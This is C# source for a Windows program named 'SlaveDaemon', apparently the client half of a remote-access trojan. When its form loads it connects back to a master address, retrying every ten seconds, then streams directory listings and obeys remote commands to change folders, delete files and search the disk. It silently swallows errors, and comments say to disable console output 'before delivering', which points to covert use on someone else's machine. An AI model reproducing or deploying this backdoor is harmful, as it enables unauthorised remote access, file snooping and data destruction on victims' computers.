using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SlaveDaemon
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			// Console.Write("Starting");
			start("127.0.0.1", 8000);
		}

		private void start(String ip, int port)
		{
			try
			{
				while (true)
				{
					try
					{
						TcpClient client = new TcpClient(ip, port);
						NetworkStream stream = client.GetStream();

						while (true)
						{
							list_dir(stream);
							write(stream, "[YIELD]"); // Finished writing, now waiting for master

							String rcvd = read(stream).Trim();

							if (rcvd == "quit")
							{
								Environment.Exit(0);
							}

							if (rcvd == "ping")
							{
								write(stream, "pong");
								continue;
							}

							// Use .. to go up
							if (rcvd.StartsWith("cd "))
							{
								String foldername = rcvd.Substring(2).Trim();

								try
								{
									Directory.SetCurrentDirectory(foldername);
								}
								catch (Exception)
								{
									write(stream, "Directory invalid");
								}
								continue;
							}

							if (rcvd.StartsWith("rm "))
							{
								String filename = rcvd.Substring(2).Trim();

								try
								{
									File.Delete(filename);
								}
								catch (Exception)
								{
									write(stream, "File invalid");
								}
								continue;
							}

							if (rcvd.StartsWith("find "))
							{
								String name = rcvd.Substring(4).Trim();

								findFilesBy(stream, name.ToLowerInvariant(), ".");
								continue;
							}

							write(stream, "Command not understood");
						}
					}
					catch (SocketException)
					{
						// Console.Write("Error 1");
						sleep_and_try_again();
					}
					catch (InvalidOperationException)
					{
						// Console.Write("Error 2");
						sleep_and_try_again();
					}
					catch (IOException)
					{
						// Console.Write("Error 3");
						sleep_and_try_again();
					}
				}
			}
			catch (Exception e)
			{
				// Disable before delivering
				// Console.Write("Error 4");
				// Console.WriteLine(e.Message);
			}
		}

		private void findFilesBy(NetworkStream stream, String search, String dir)
		{
			string[] files = Directory.GetFiles(dir); 

			for (int i = 0; i < files.Length; ++i)
			{
				string name = files[i];
				if (name.ToLowerInvariant().Contains(search))
				{
					write(stream, name);
				}
			}

			files = Directory.GetDirectories(dir);

			for (int i = 0; i < files.Length; ++i)
			{
				string name = files[i];

				findFilesBy(stream, search, name);
			}
		}

		private void sleep_and_try_again()
		{
			// Disable before delivering
			// Console.WriteLine("Connection failed, will try again in 10s");
			System.Threading.Thread.Sleep(10000);
		}

		private void list_dir(NetworkStream stream)
		{
			write(stream, "\n" + Directory.GetCurrentDirectory());
			write(stream, "    (D) ..");

			string[] files = Directory.GetDirectories(".");

			for (int i = 0; i < files.Length; ++i)
			{
				string name = files[i];
				if (name.StartsWith(".\\"))
				{
					name = name.Substring(2);
				}
				write(stream, "    (D) " + name);
			}

			files = Directory.GetFiles(".");

			for (int i = 0; i < files.Length; ++i)
			{
				string name = files[i];
				if (name.StartsWith(".\\"))
				{
					name = name.Substring(2);
				}
				write(stream, "    (F) " + name);
			}
		}

		private void write(NetworkStream stream, String msg)
		{
			msg += "\n";

			Byte[] data = System.Text.Encoding.Unicode.GetBytes(msg);

			Byte[] buffer = new Byte[4];
			buffer[0] = (byte)(data.Length);
			buffer[1] = (byte)(data.Length >> 8);
			buffer[2] = (byte)(data.Length >> 16);
			buffer[3] = (byte)(data.Length >> 24);

			stream.Write(buffer, 0, 4);

			stream.Write(data, 0, data.Length);
		}

		private String read(NetworkStream stream)
		{
			Byte[] buffer = new Byte[4];
			stream.Read(buffer, 0, 4);

			int size = (int)buffer[0];
			size |= (buffer[1] << 8);
			size |= (buffer[2] << 16);
			size |= (buffer[3] << 24);

			buffer = new Byte[size];
			stream.Read(buffer, 0, size);

			String str = System.Text.Encoding.Unicode.GetString(buffer, 0, size);
			return str;
		}
	}
}
